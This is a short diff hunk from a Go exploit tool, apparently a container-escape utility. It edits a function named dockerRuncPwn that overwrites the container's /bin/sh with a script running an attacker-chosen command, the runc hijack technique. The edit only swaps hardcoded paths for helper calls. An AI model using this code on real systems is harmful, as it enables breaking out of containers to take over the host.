@@ -41,8 +41,8 @@ func dockerRuncPwn(hijackCommand string) {
 		return
 	}
 
-	payload := fmt.Sprintf("#!/bin/bash \n %s", hijackCommand)
-	fd, err := os.Create("/bin/sh")
+	payload := fmt.Sprintf("#!%s \n %s", util.BashPath(), hijackCommand)
+	fd, err := os.Create(util.ShellPath())
 	if err != nil {
 		fmt.Println(err)
 		return
